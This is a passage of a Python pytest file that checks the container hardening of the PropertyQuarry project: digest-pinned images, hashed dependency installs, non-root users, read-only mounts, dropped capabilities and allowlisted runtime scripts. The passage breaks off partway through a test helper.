def test_optional_magicfit_reviewer_trust_overlay_is_explicit_and_read_only() -> None:
    base_compose = _read("docker-compose.property.yml")
    overlay = _read("docker-compose.property-magicfit-reviewer.yml")

    assert "PROPERTYQUARRY_MAGICFIT_REVIEWER_TRUST_STORE_FILE" not in base_compose
    assert overlay.count("  propertyquarry-api:\n") == 1
    assert overlay.count("  propertyquarry-scheduler:\n") == 1
    assert overlay.count("PROPERTYQUARRY_MAGICFIT_REVIEWER_TRUST_STORE_FILE") == 2
    assert overlay.count("PROPERTYQUARRY_MAGICFIT_REVIEWER_TRUST_DIR") == 2
    assert overlay.count("read_only: true") == 2
    assert overlay.count("create_host_path: false") == 2
    assert "private" not in overlay.lower()
    assert "PROPERTYQUARRY_MAGICFIT_REVIEWER_TRUST_DIR=\n" in _read(
        ".env.example"
    )


def test_security_posture_rejects_writable_magicfit_reviewer_trust_overlay(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    def remove_one_read_only(overlay: str) -> str:
        assert overlay.count("        read_only: true\n") == 2
        return overlay.replace("        read_only: true\n", "", 1)

    failures = _security_posture_failures_with_file_mutation(
        monkeypatch,
        path="docker-compose.property-magicfit-reviewer.yml",
        mutate=remove_one_read_only,
    )

    assert failures == [
        "MagicFit reviewer overlay must mount one explicit external trust "
        "directory read-only without host-path creation in API and scheduler"
    ]


def test_property_security_posture_requires_hardened_durable_worker(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    def make_worker_generic(compose: str) -> str:
        marker = 'PROPERTYQUARRY_WORKER_PROFILE: "property_only"'
        assert compose.count(marker) == 1
        return compose.replace(
            marker,
            'PROPERTYQUARRY_WORKER_PROFILE: "generic"',
            1,
        )

    failures = _security_posture_failures_with_file_mutation(
        monkeypatch,
        path="docker-compose.property.yml",
        mutate=make_worker_generic,
    )

    assert failures == [
        "docker-compose.property.yml must keep a hardened property-only durable worker"
    ]


def test_property_security_posture_checks_every_non_scratch_stage_digest(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    def remove_glib_builder_digest(dockerfile: str) -> str:
        updated, count = re.subn(
            r"^FROM debian:13\.6-slim@sha256:[0-9a-f]{64} AS glib-builder$",
            "FROM debian:13.6-slim AS glib-builder",
            dockerfile,
            count=1,
            flags=re.MULTILINE,
        )
        assert count == 1
        return updated

    failures = _security_posture_failures_with_file_mutation(
        monkeypatch,
        path="ea/Dockerfile.property",
        mutate=remove_glib_builder_digest,
    )

    assert failures == [
        "ea/Dockerfile.property must pin every non-scratch FROM image by digest: "
        "debian:13.6-slim"
    ]


@pytest.mark.parametrize(
    "path",
    ("ea/Dockerfile.property", "ea/Dockerfile.property-web"),
)
def test_property_security_posture_requires_fixed_numeric_final_user(
    monkeypatch: pytest.MonkeyPatch,
    path: str,
) -> None:
    def replace_final_user(dockerfile: str) -> str:
        before, marker, after = dockerfile.rpartition("USER 10001:10001")
        assert marker
        return before + "USER ea" + after

    failures = _security_posture_failures_with_file_mutation(
        monkeypatch,
        path=path,
        mutate=replace_final_user,
    )

    assert failures == [f"{path} must run its final stage as USER 10001:10001"]


def test_property_security_posture_requires_hashed_render_install(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    def remove_require_hashes(dockerfile: str) -> str:
        marker = "        --require-hashes \\\n"
        assert dockerfile.count(marker) == 1
        return dockerfile.replace(marker, "", 1)

    failures = _security_posture_failures_with_file_mutation(
        monkeypatch,
        path="ea/Dockerfile.property",
        mutate=remove_require_hashes,
    )

    assert failures == [
        "ea/Dockerfile.property must install /app/requirements.property-render.txt "
        "with --require-hashes and --only-binary=:all:"
    ]


def test_property_security_posture_requires_hash_for_every_render_requirement(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    def remove_pillow_hash(requirements: str) -> str:
        marker = (
            "Pillow==12.3.0 \\\n"
            "    --hash=sha256:78cb2c6865a35ab8ff8b75fd122f6033b92a62c82801110e48ddd6c936a45d91\n"
        )
        assert requirements.count(marker) == 1
        return requirements.replace(marker, "Pillow==12.3.0\n", 1)

    failures = _security_posture_failures_with_file_mutation(
        monkeypatch,
        path="ea/requirements.property-render.txt",
        mutate=remove_pillow_hash,
    )

    assert failures == [
        "ea/requirements.property-render.txt must pin every requirement with a "
        "sha256 hash: Pillow==12.3.0"
    ]


def test_property_security_posture_requires_willhaben_helper_only_in_web_runtime(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    helper_copy = (
        "COPY scripts/willhaben_property_packet.py "
        "/app/scripts/willhaben_property_packet.py\n"
    )
    assert helper_copy not in _read("ea/Dockerfile.property")
    assert helper_copy in _read("ea/Dockerfile.property-web")

    def remove_web_helper(dockerfile: str) -> str:
        assert dockerfile.count(helper_copy) == 1
        return dockerfile.replace(helper_copy, "", 1)

    failures = _security_posture_failures_with_file_mutation(
        monkeypatch,
        path="ea/Dockerfile.property-web",
        mutate=remove_web_helper,
    )

    assert failures == [
        "ea/Dockerfile.property-web must explicitly copy the Willhaben packet helper"
    ]


@pytest.mark.parametrize(
    ("shared_module", "render_image_copy_expected"),
    (
        ("property_magicfit_contact_sheet.py", False),
        ("property_magicfit_delivery_contract.py", False),
        ("property_magicfit_public_eligibility.py", False),
        ("property_magicfit_reviewer_authority.py", False),
        ("property_magicfit_secure_io.py", False),
        ("property_tour_publication_lock.py", False),
        ("browseract_ui_media.py", False),
        ("property_scene_video_shared_env.py", False),
        ("propertyquarry_playwright_runtime.py", True),
    ),
)
def test_property_security_posture_requires_magicfit_shared_modules_in_web_runtime(
    monkeypatch: pytest.MonkeyPatch,
    shared_module: str,
    render_image_copy_expected: bool,
) -> None:
    helper_copy = f"COPY scripts/{shared_module} /app/scripts/{shared_module}\n"
    assert (helper_copy in _read("ea/Dockerfile.property")) is render_image_copy_expected
    assert helper_copy in _read("ea/Dockerfile.property-web")

    def remove_web_helper(dockerfile: str) -> str:
        assert dockerfile.count(helper_copy) == 1
        return dockerfile.replace(helper_copy, "", 1)

    failures = _security_posture_failures_with_file_mutation(
        monkeypatch,
        path="ea/Dockerfile.property-web",
        mutate=remove_web_helper,
    )

    assert failures == [
        "ea/Dockerfile.property-web must explicitly copy the shared MagicFit "
        "contact-sheet, delivery-contract, eligibility, reviewer-authority, "
        "secure-I/O, publication-lock, browser runtime, media, and scene-video "
        "environment helpers"
    ]


def test_property_dockerfile_allowlists_runtime_scripts() -> None:
    dockerfile = _read("ea/Dockerfile.property")

    assert "COPY . /tmp/src" not in dockerfile
    assert "COPY ea/app /app/app" not in dockerfile
    copied_scripts = re.findall(r"COPY\s+scripts/([^\s]+)\s+/app/scripts/", dockerfile)
    assert copied_scripts == [
        "property_tour_runtime_paths.py",
        "property_render_video_probe.py",
        "propertyquarry_playwright_runtime.py",
        "generate_property_reconstruction.py",
        "property_reconstruction_styles.py",
        "property_reconstruction_render_bridge.py",
    ]
    for retained_runtime_source in (
        "ea/property_render_entrypoint.py",
        "ea/property_render_elf_validator.py",
        "ea/property_render_ffmpeg_validator.py",
        "ea/property_render_runtime_preflight.py",
        "ea/property_render_media_provenance.json",
        "vendor/three",
    ):
        assert retained_runtime_source in dockerfile
    for excluded_provider_source in (
        "willhaben_property_packet.py",
        "property_magicfit_env.py",
        "mootion_movie_worker.py",
        "render_magicfit_property_flythrough.py",
        "render_onemin_property_i2v_segment.py",
        "render_omagic_property_model_walkthrough.py",
        "render_magicai_model_upload_adapter.py",
        "property_scene_video_readiness_report.py",
        "materialize_scene_video_provider_refresh_packet.py",
        "import_3dvista_export.py",
        "import_pano2vr_export.py",
        "import_krpano_walkable_scene.py",
        "verify_property_tour_vendor_tooling.py",
        "intake_3dvista_gold_artifact.py",
        "COPY LTDs.md",
    ):
        assert excluded_provider_source not in dockerfile
    assert "PLAYWRIGHT_BROWSERS_PATH=/ms-playwright" in dockerfile
    assert "python -m playwright install chromium" in dockerfile
    assert "playwright install --with-deps" not in dockerfile
    assert "for script in /tmp/src/scripts/*" not in dockerfile
    assert 'for script in "$APP_SRC"/scripts/*' not in dockerfile
    assert 'cp "$script" /app/scripts/' not in dockerfile


def test_property_render_image_uses_minimal_offline_pinned_browser_probe() -> None:
    dockerfile = _read("ea/Dockerfile.property")
    ffmpeg_recipe = _read("ea/property_render_ffmpeg_build_recipe.sh")
    acceptance = _read("scripts/accept_magicfit_delivery.py")
    probe = _read("scripts/property_render_video_probe.py")
    preflight = _read("ea/property_render_runtime_preflight.py")

    assert "--disable-ffprobe" in ffmpeg_recipe
    assert '"ffprobe"' in dockerfile
    assert 'shutil.which("ffprobe")' not in acceptance
    assert "probe_local_video(path)" in acceptance
    assert 'offline=True' in probe
    assert 'service_workers="block"' in probe
    assert 'page.route("**/*", route_local_asset)' in probe
    assert "render_video_probe.probe_local_video(mp4_path)" in preflight
    assert '"offline_render_video_probe": "pass"' in preflight
    assert "COPY scripts/property_render_video_probe.py /app/scripts/property_render_video_probe.py" in dockerfile
    assert "COPY scripts/accept_magicfit_delivery.py /app/scripts/accept_magicfit_delivery.py" not in dockerfile


def test_magicfit_acceptance_probes_the_stable_descriptor_via_private_copy(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    from scripts import accept_magicfit_delivery as acceptance

    source = tmp_path / "source.mp4"
    body = b"stable-video-bytes"
    source.write_bytes(body)
    observed_probe_paths: list[Path] = []

    def _probe(path: Path) -> dict[str, object]:
        observed_probe_paths.append(path)
        assert path.is_absolute()
        assert path.suffix == ".mp4"
        assert path.read_bytes() == body
        assert path.stat().st_mode & 0o777 == 0o600
        return {
            "duration_seconds": 1.25,
            "height": 720,
            "size_bytes": len(body),
            "width": 1280,
        }

    monkeypatch.setattr(acceptance, "probe_local_video", _probe)
    descriptor = os.open(source, os.O_RDONLY | os.O_NOFOLLOW)
    try:
        result = acceptance._video_probe(
            Path("walkthrough.mp4"),
            expected_size_bytes=len(body),
            _probe_descriptor=descriptor,
        )
    finally:
        os.close(descriptor)

    assert result == {"duration_seconds": 1.25, "size_bytes": len(body)}
    assert len(observed_probe_paths) == 1
    assert not observed_probe_paths[0].exists()


def test_runtime_dockerfiles_fail_closed_for_worker_and_scheduler_health() -> None:
    for path in ("Dockerfile", "ea/Dockerfile"):
        dockerfile = _read(path)
        healthcheck = dockerfile[dockerfile.index("HEALTHCHECK") :]

        assert 'worker|scheduler) exec python -m app.scheduler_healthcheck' in healthcheck
        assert 'worker|scheduler) exit 0' not in healthcheck
    render_dockerfile = _read("ea/Dockerfile.property")
    assert "app.scheduler_healthcheck" not in render_dockerfile
    assert "app.runner" not in render_dockerfile


def test_property_render_dockerfile_prunes_frozen_packages_and_restores_only_pinned_gbm() -> None:
    dockerfile = _read("ea/Dockerfile.property")
    prune_at = dockerfile.rindex("RUN set -eux;")
    final_at = dockerfile.index("FROM scratch AS runtime")
    prune = dockerfile[prune_at:final_at]

    assert "apt-get purge --yes --allow-remove-essential --no-auto-remove" in prune
    for package in (
        "gzip",
        "libgbm1",
        "libllvm19",
        "libxml2",
        "mesa-libgallium",
        "perl-base",
        "bsdutils",
        "libblkid1",
        "liblastlog2-2",
        "libmount1",
        "libsmartcols1",
        "libuuid1",
        "login",
        "mount",
    ):
        assert f"        {package} \\\n" in prune
    assert "        util-linux;" in prune
    assert "removed != expected" in prune
    assert "added=sorted(after-before)" in prune
    assert "or bool(added)" in prune
    for package in (
        '"libgbm1"',
        '"libllvm19"',
        '"libxml2"',
        '"mesa-libgallium"',
        '"perl-base"',
    ):
        assert package in prune
    assert (
        'forbidden={"gzip", "libxml2", "llvm-toolchain-19", '
        '"mesa", "perl", "util-linux"}'
    ) in prune

    gbm_sha256 = "ab1e16db65ef9809ee3bc2925c611dcb15e2d78a510c310f0193716c16ea6c2e"
    assert prune.count(gbm_sha256) == 2
    assert "test \"${libgbm_real}\" = /usr/lib/x86_64-linux-gnu/libgbm.so.1.0.0" in prune
    assert "cp --preserve=mode,ownership,timestamps" in prune
    assert "install -m 0644" in prune
    assert "ln -s libgbm.so.1.0.0 /usr/lib/x86_64-linux-gnu/libgbm.so.1" in prune
    assert "/sbin/ldconfig" in prune
    assert "rmdir /tmp/property-render-libgbm" in prune
    assert prune.index("cp --preserve=mode,ownership,timestamps") < prune.index(
        "apt-get purge"
    )
    assert prune.index("apt-get purge") < prune.index("install -m 0644")
    assert prune.index("install -m 0644") < prune.index(
        "property_render_elf_validator.py"
    )
    assert '"perl"' in prune
    assert "FROM scratch AS runtime" in dockerfile
    runtime = dockerfile[final_at:]
    assert runtime.count("COPY ") == 1
    assert "RUN " not in runtime


def test_property_web_dockerfile_keeps_reconstruction_lightweight_and_excludes_browser_payloads() -> None:
    dockerfile = _read("ea/Dockerfile.property-web")

    assert dockerfile.startswith(
        "FROM python:3.12-slim@sha256:57cd7c3a7a273101a6485ba99423ee568157882804b1124b4dd04266317710de AS prepared\n"
    )
    assert "curl" not in dockerfile.lower()
    assert "python3-numpy" not in dockerfile.lower()
    assert "http.client.HTTPConnection" in dockerfile
    assert "exec /usr/local/bin/python -c" in dockerfile
    assert "COPY . /tmp/src" not in dockerfile
    assert "COPY ea/requirements.txt /app/requirements.txt" in dockerfile
    assert "COPY ea/requirements.lock /app/requirements.lock" in dockerfile
    assert (
        "COPY scripts/check_property_search_storage_schema.py "
        "/app/scripts/check_property_search_storage_schema.py"
        in dockerfile
    )
    assert (
        "COPY scripts/backfill_property_research_packet_links.py "
        "/app/scripts/backfill_property_research_packet_links.py"
        in dockerfile
    )
    assert "COPY scripts/willhaben_property_packet.py /app/scripts/willhaben_property_packet.py" in dockerfile
    assert (
        "COPY scripts/property_magicfit_contact_sheet.py "
        "/app/scripts/property_magicfit_contact_sheet.py"
    ) in dockerfile
    assert (
        "COPY scripts/property_magicfit_delivery_contract.py "
        "/app/scripts/property_magicfit_delivery_contract.py"
    ) in dockerfile
    assert (
        "COPY scripts/property_magicfit_public_eligibility.py "
        "/app/scripts/property_magicfit_public_eligibility.py"
    ) in dockerfile
    assert (
        "COPY scripts/property_magicfit_reviewer_authority.py "
        "/app/scripts/property_magicfit_reviewer_authority.py"
    ) in dockerfile
    assert (
        "COPY scripts/property_magicfit_secure_io.py "
        "/app/scripts/property_magicfit_secure_io.py"
    ) in dockerfile
    assert (
        "COPY scripts/property_tour_publication_lock.py "
        "/app/scripts/property_tour_publication_lock.py"
    ) in dockerfile
    assert "COPY scripts/render_magicfit_property_flythrough.py /app/scripts/render_magicfit_property_flythrough.py" in dockerfile
    assert "COPY scripts/render_onemin_property_i2v_segment.py /app/scripts/render_onemin_property_i2v_segment.py" in dockerfile
    assert "COPY scripts/render_omagic_property_model_walkthrough.py /app/scripts/render_omagic_property_model_walkthrough.py" in dockerfile
    assert "COPY scripts/render_magicai_model_upload_adapter.py /app/scripts/render_magicai_model_upload_adapter.py" in dockerfile
    assert "COPY scripts/property_scene_video_readiness_report.py /app/scripts/property_scene_video_readiness_report.py" in dockerfile
    assert "COPY scripts/discover_property_tour_exports.py /app/scripts/discover_property_tour_exports.py" in dockerfile
    assert "COPY scripts/materialize_property_tour_export_manifest.py /app/scripts/materialize_property_tour_export_manifest.py" in dockerfile
    assert "COPY scripts/generate_property_reconstruction.py /app/scripts/generate_property_reconstruction.py" in dockerfile
    assert "COPY scripts/verify_property_tour_vendor_tooling.py /app/scripts/verify_property_tour_vendor_tooling.py" not in dockerfile
    assert "PLAYWRIGHT_BROWSERS_PATH=/ms-playwright" not in dockerfile
    assert "python -m playwright install --with-deps chromium" not in dockerfile
    assert "blender" not in dockerfile.lower()
    assert "colmap" not in dockerfile.lower()
    assert "meshlab" not in dockerfile.lower()
    assert "ffmpeg" not in dockerfile.lower()
    assert "espeak" not in dockerfile.lower()
    assert "imagemagick" not in dockerfile.lower()
    assert "libimage-exiftool-perl" not in dockerfile.lower()
    assert "for script in /tmp/src/scripts/*" not in dockerfile
    assert 'cp "$script" /app/scripts/' not in dockerfile

    assert (
        "COPY --chmod=0555 ea/property_web_entrypoint.py "
        "/usr/local/libexec/property_web_entrypoint.py"
    ) in dockerfile
    assert (
        "COPY --chmod=0555 ea/property_web_elf_validator.py "
        "/usr/local/libexec/property_web_elf_validator.py"
    ) in dockerfile
    assert "COPY ea/docker-entrypoint.sh" not in dockerfile
    assert "chown -R ea:ea /app /data /home/ea" in dockerfile
    assert "/usr/local/libexec/property_web_entrypoint.py;" not in dockerfile
    assert "apt-get purge --yes --allow-remove-essential --no-auto-remove" in dockerfile
    assert "property-web-packages.before" in dockerfile
    assert "property-web-packages.after" in dockerfile
    assert "removed != expected" in dockerfile
    assert "added=sorted(after-before)" in dockerfile
    assert "or bool(added)" in dockerfile
    for package in (
        "gzip",
        "bsdutils",
        "libblkid1",
        "liblastlog2-2",
        "libmount1",
        "libsmartcols1",
        "libuuid1",
        "login",
        "mount",
        "perl-base",
    ):
        assert f"        {package} \\\n" in dockerfile
    assert "        util-linux;" in dockerfile
    assert "test -s /var/lib/dpkg/status" in dockerfile
    assert 'audit_output="$(dpkg --audit)"' in dockerfile
    assert 'test -z "${audit_output}"' in dockerfile
    assert 'in {"gzip", "perl", "util-linux"}' in dockerfile
    assert "rm -rf /var/lib/dpkg" not in dockerfile
    assert "! command -v gzip" in dockerfile
    assert "! command -v gunzip" in dockerfile
    assert "! command -v perl" in dockerfile
    assert "! command -v runuser" in dockerfile
    assert 'modules=("_uuid", "_tkinter")' in dockerfile
    assert 'importlib.util.find_spec("_uuid") is None' in dockerfile
    assert 'importlib.util.find_spec("_tkinter") is None' in dockerfile
    assert "uuid.uuid1().version == 1" in dockerfile
    assert "uuid.uuid4().version == 4" in dockerfile
    assert "python -I -S /usr/local/libexec/property_web_elf_validator.py" in dockerfile
    assert "rm -f /usr/local/libexec/property_web_elf_validator.py" in dockerfile

    assert "FROM scratch AS runtime" in dockerfile
    assert "COPY --from=prepared / /" in dockerfile
    assert "USER 10001:10001" in dockerfile
    assert (
        'ENTRYPOINT ["/usr/local/bin/python", "-I", "-S", '
        '"/usr/local/libexec/property_web_entrypoint.py"]'
    ) in dockerfile
    assert 'CMD ["/usr/local/bin/python", "-m", "app.runner"]' in dockerfile

    prune_at = dockerfile.index("apt-get purge")
    final_at = dockerfile.index("FROM scratch AS runtime")
    assert prune_at > dockerfile.index("COPY LTDs.md /app/LTDs.md")
    assert "COPY " not in dockerfile[prune_at:final_at]
    runtime = dockerfile[final_at:]
    assert runtime.count("COPY ") == 1
    assert "RUN " not in runtime
    assert "apt-get" not in runtime
    assert "dpkg" not in runtime


def test_property_web_services_keep_the_fixed_image_identity_and_entrypoint() -> None:
    compose = _read("docker-compose.property.yml")
    api = compose.split("  propertyquarry-api:\n", 1)[1].split(
        "  propertyquarry-migrate:\n", 1
    )[0]
    migrate = compose.split("  propertyquarry-migrate:\n", 1)[1].split(
        "  propertyquarry-worker:\n", 1
    )[0]
    worker = compose.split("  propertyquarry-worker:\n", 1)[1].split(
        "  propertyquarry-scheduler:\n", 1
    )[0]
    scheduler = compose.split("  propertyquarry-scheduler:\n", 1)[1].split(
        "  propertyquarry-render-tools:\n", 1
    )[0]

    for section in (api, migrate, worker, scheduler):
        assert re.search(r"^    (?:user|entrypoint):", section, flags=re.MULTILINE) is None
        assert "/var/run/docker.sock" not in section
        assert "\n    cap_drop:\n      - ALL\n" in section
        assert '\n    security_opt:\n      - "no-new-privileges:true"\n' in section
        for forbidden in ("group_add:", "cap_add:", "privileged:", "network_mode: host"):
            assert forbidden not in section

    assert "\n    command:" not in api
    assert (
        'command: ["/usr/local/bin/python", "-m", '
        '"app.product.propertyquarry_schema", "migrate"]'
        in migrate
    )
    assert "\n    command:" not in worker
    assert "\n    read_only: true\n" in worker
    assert "\n    command:" not in scheduler


def test_property_runtime_copied_scripts_do_not_depend_on_fleet_paths() -> None:
    dockerfile = _read("ea/Dockerfile.property")
    copied_scripts = re.findall(r"COPY\s+scripts/([^\s]+)\s+/app/scripts/", dockerfile)

    assert copied_scripts == [
        "property_tour_runtime_paths.py",
        "property_render_video_probe.py",
        "propertyquarry_playwright_runtime.py",
        "generate_property_reconstruction.py",
        "property_reconstruction_styles.py",
        "property_reconstruction_render_bridge.py",
    ]
    for script_name in copied_scripts:
        body = _read(f"scripts/{script_name}")
        assert "/docker/fleet" not in body, script_name
        assert "/tmp/propertyquarry" not in body, script_name

    for required_runtime_copy in (
        "COPY --chmod=0444 ea/app/__init__.py /app/ea/app/__init__.py",
        "COPY --chmod=0444 ea/app/observability.py /app/ea/app/observability.py",
        (
            "COPY --chmod=0444 ea/app/services/__init__.py "
            "/app/ea/app/services/__init__.py"
        ),
        (
            "COPY --chmod=0444 ea/app/services/admission_control.py "
            "/app/ea/app/services/admission_control.py"
        ),
    ):
        assert required_runtime_copy in dockerfile


def test_property_compose_container_names_are_recoverable() -> None:
    compose = _read("docker-compose.property.yml")
    api_section = compose.split("  propertyquarry-api:", 1)[1].split(
        "  propertyquarry-migrate:", 1
    )[0]

    assert "dockerfile: ea/Dockerfile.property-web" in compose
    assert 'image: "${PROPERTYQUARRY_WEB_IMAGE:-propertyquarry-standalone-web-runtime:latest}"' in compose
    assert "propertyquarry-render-tools:" in compose
    assert "dockerfile: ea/Dockerfile.property" in compose
    assert 'image: "${PROPERTYQUARRY_RENDER_IMAGE:-propertyquarry-standalone-render-runtime:latest}"' in compose
    assert 'container_name: "${PROPERTYQUARRY_API_CONTAINER_NAME:-propertyquarry-api-live}"' in compose
    assert 'container_name: "${PROPERTYQUARRY_WORKER_CONTAINER_NAME:-propertyquarry-worker-live}"' in compose
    assert 'container_name: "${PROPERTYQUARRY_SCHEDULER_CONTAINER_NAME:-propertyquarry-scheduler-live}"' in compose
    assert 'container_name: "${PROPERTYQUARRY_DB_CONTAINER_NAME:-propertyquarry-db-live}"' in compose
    assert 'container_name: "${PROPERTYQUARRY_RENDER_CONTAINER_NAME:-propertyquarry-render-live}"' in compose
    assert compose.count("path: ./state/runtime/property_scene_video_shared.env") == 1
    assert "property_scene_video_shared.env" not in api_section
    assert compose.count(
        'PROPERTYQUARRY_PROPERTY_SEARCH_ERASURE_SECRET: "${PROPERTYQUARRY_PROPERTY_SEARCH_ERASURE_SECRET:-}"'
    ) == 4
    migration_section = compose.split("  propertyquarry-migrate:", 1)[1].split(
        "  propertyquarry-worker:", 1
    )[0]
    assert "PROPERTYQUARRY_PROPERTY_SEARCH_ERASURE_SECRET" in migration_section
    assert "property_scene_video_shared.env" not in migration_section
    assert "env_file:" not in migration_section
    assert "EA_ROLE: property-search-migrate" in migration_section
    assert 'command: ["/usr/local/bin/python", "-m", "app.product.propertyquarry_schema", "migrate"]' in migration_section
    assert 'restart: "no"' in migration_section
    worker_section = compose.split("  propertyquarry-worker:", 1)[1].split(
        "  propertyquarry-scheduler:", 1
    )[0]
    assert "PROPERTYQUARRY_PROPERTY_SEARCH_ERASURE_SECRET" in worker_section
    assert "EA_ROLE: worker" in worker_section
    assert 'EA_STORAGE_BACKEND: "postgres"' in worker_section
    assert 'PROPERTYQUARRY_WORKER_PROFILE: "property_only"' in worker_section
    assert "property_scene_video_shared.env" not in worker_section
    assert "propertyquarry_render_internal" not in worker_section
    assert "read_only: true" in worker_section
    assert "propertyquarry_artifacts:/data/artifacts" in worker_section
    assert "EA_SCHEDULER_HEARTBEAT_PATH: /data/artifacts/propertyquarry-scheduler-heartbeat.json" in compose
    assert 'EA_SCHEDULER_HEARTBEAT_MAX_AGE_SECONDS: "${EA_SCHEDULER_HEARTBEAT_MAX_AGE_SECONDS:-900}"' in compose
    assert 'test: ["CMD", "/usr/local/bin/python", "-m", "app.scheduler_healthcheck"]' in compose
    scheduler_section = compose.split("  propertyquarry-scheduler:", 1)[1].split("  propertyquarry-db:", 1)[0]
    assert "PROPERTYQUARRY_PROPERTY_SEARCH_ERASURE_SECRET" in scheduler_section
    assert "property_scene_video_shared.env" not in scheduler_section
    assert "disable: true" not in scheduler_section
    render_section = compose.split("  propertyquarry-render-tools:", 1)[1].split("  propertyquarry-db:", 1)[0]
    assert "PROPERTYQUARRY_PROPERTY_SEARCH_ERASURE_SECRET" not in render_section
    assert "PROPERTYQUARRY_RENDER_DATABASE_URL:?Set a least-privilege" in render_section
    assert "${DATABASE_URL:-postgresql://postgres:" not in render_section
    assert "profiles:" not in render_section
    assert "- render-tools" not in render_section
    assert (
        'command: ["/usr/local/bin/python", '
        '"-I", "/app/scripts/property_reconstruction_render_bridge.py"]'
    ) in render_section
    assert "env_file:" in render_section
    assert "path: ./state/runtime/property_scene_video_shared.env" in render_section
    assert "EA_ARTIFACTS_DIR" not in render_section
    assert "EA_RESPONSES_PROVIDER_LEDGER_DIR" not in render_section
    assert "TEABLE_" not in render_section
    assert "incoming_property_tours" not in render_section
    assert "provider-ledger" not in render_section
    assert "propertyquarry_artifacts" not in render_section
    assert "./config:" not in render_section
    assert render_section.count("propertyquarry_public_tours:/data/public_property_tours") == 1
    assert 'PROPERTYQUARRY_RECONSTRUCTION_RENDER_HOST: "0.0.0.0"' in render_section
    assert (
        'PROPERTYQUARRY_RECONSTRUCTION_RENDER_BRIDGE_TOKEN: '
        '"${PROPERTYQUARRY_RECONSTRUCTION_RENDER_BRIDGE_TOKEN:?'
    ) in render_section
    assert "cap_drop:\n      - ALL" in render_section
    assert 'security_opt:\n      - "no-new-privileges:true"' in render_section
    assert "read_only: true" in render_section
    assert (
        "tmpfs:\n      - /tmp:rw,nosuid,nodev,noexec,size=2147483648"
        in render_section
    )
    assert "- /run:rw,nosuid,nodev,noexec,size=16777216" in render_section
    assert 'mem_limit: "${PROPERTYQUARRY_RENDER_MEMORY_LIMIT:-4g}"' in render_section
    assert (
        'memswap_limit: "${PROPERTYQUARRY_RENDER_MEMORY_SWAP_LIMIT:-4g}"'
        in render_section
    )
    assert "pids_limit: ${PROPERTYQUARRY_RENDER_PIDS_LIMIT:-256}" in render_section
    assert 'shm_size: "${PROPERTYQUARRY_RENDER_SHM_SIZE:-256m}"' in render_section
    assert "networks:\n      - propertyquarry_render_internal" in render_section
    assert "      - default" not in render_section
    assert "networks:\n      - default\n      - propertyquarry_render_internal" in api_section
    assert (
        "networks:\n  propertyquarry_render_internal:\n    internal: true"
        in compose
    )
    assert (
        '"CMD",\n          "/usr/local/bin/property-render-env-launcher",\n'
        '          "/usr/local/bin/python",\n          "-I",\n'
        '          "-S",\n          "-c"'
    ) in render_section
    assert "http.client.HTTPConnection('127.0.0.1', 8091, timeout=10)" in render_section
    assert "connection.request('GET', '/health/ready')" in render_section
    assert "response.status == 200" in render_section
    for identity_only_probe in (
        "command -v blender",
        "command -v colmap",
        "command -v exiftool",
        "command -v convert",
        "import numpy",
        "curl -fsS",
    ):
        assert identity_only_probe not in render_section
    assert "http://127.0.0.1:8090/health/live" not in render_section


def test_property_vendor_runtime_readiness_uses_retained_functional_capabilities() -> None:
    verifier = _read("scripts/verify_property_tour_vendor_tooling.py")
    ffmpeg_audit = _read("ea/property_render_ffmpeg_validator.py")

    for required in (
        '"ffmpeg:bounded_encoder"',
        '"ffmpeg:functional_encoder"',
        '"python:PIL"',
        '"python:playwright"',
        '"python:direct_glb"',
        'RUNTIME_DIRECT_GLB_SYMBOL = "_write_glb"',
        'audit_ffmpeg_encoder as _ffmpeg_encoder_capability',
        'capture_container_tool as _capture_container_tool',
        'capture_local_tool as _capture_local_tool',
        '"legacy_host_tool_observations"',
        '"affects_runtime_readiness": False',
        "Legacy host tool identities are informational only",
    ):
        assert required in verifier

    for required in (
        'else "functional_host"',
        '"rawvideo_decoder_only"',
        '"rawvideo_demuxer_only"',
        '"libx264_encoder_only"',
        '"mov_muxer_only"',
        '"devices_absent"',
        '"file_and_pipe_protocols_only"',
        '"bounded_filter_surface"',
        '"bounded_bitstream_filter_surface"',
        '"hwaccels_absent"',
        '"static_linkage_observed"',
        '"version_exact"',
        '"exact_configure_contract"',
        '"explicit_enable_allowlist"',
        '"explicit_disable_contract"',
        '"ffprobe_absent"',
        '"ffplay_absent"',
        '"--disable-network"',
        '"--disable-everything"',
        '"--disable-autodetect"',
        'RUNTIME_MEDIA_PROVENANCE_PATH = Path(',
        '"propertyquarry.render_media_provenance.v1"',
        '"binary_sha256_bound"',
        '"build_receipts_bound"',
    ):
        assert required in ffmpeg_audit
    assert ffmpeg_audit.count('"bounded_checks": bounded_checks') == 1

    runtime_capabilities = verifier.split("runtime_generated_tour_tools = {", 1)[1].split(
        "if runtime_only:", 1
    )[0]
    for removed_identity_gate in (
        '"blender"',
        '"colmap"',
        '"exiftool"',
        '"convert"',
        '"python:numpy"',
    ):
        assert removed_identity_gate not in runtime_capabilities


def _bounded_ffmpeg_test_runner() -> tuple[
    object,
    dict[str, str],
    dict[str, object],
    dict[str, str],
]:
    from ea import property_render_ffmpeg_validator as verifier

    registry_outputs = {
        "-version": f"ffmpeg version {verifier.FFMPEG_EXPECTED_VERSION} Copyright",
        "-buildconf": (
            "ffmpeg version test\nconfiguration: "
            + shlex.join(sorted(verifier.FFMPEG_REQUIRED_CONFIGURE_FLAGS))
            + "\nlibavutil 60.0"
        ),
        "-decoders": "Decoders:\n V..... rawvideo Raw video",
        "-demuxers": "File formats:\n D rawvideo raw video",
        "-encoders": "Encoders:\n V..... libx264 H.264",
        "-muxers": "File formats:\n E mov QuickTime\n E mp4 MP4",
        "-devices": "Devices:\n D. = Demuxing supported\n .E = Muxing supported",
        "-protocols": "Input:\n file\n pipe\nOutput:\n file\n pipe",
        "-filters": "Filters:\n"
        + "\n".join(
            f" .. {name} V->V"
            for name in (
                "abuffer",
                "abuffersink",
                "aformat",
                "anull",
                "atrim",
                "buffer",
                "buffersink",
                "crop",
                "format",
                "fps",
                "hflip",
                "null",
                "rotate",
                "scale",
                "transpose",
                "trim",
                "vflip",
            )
        ),
        "-bsfs": "Bitstream filters:\naac_adtstoasc\nvp9_superframe",
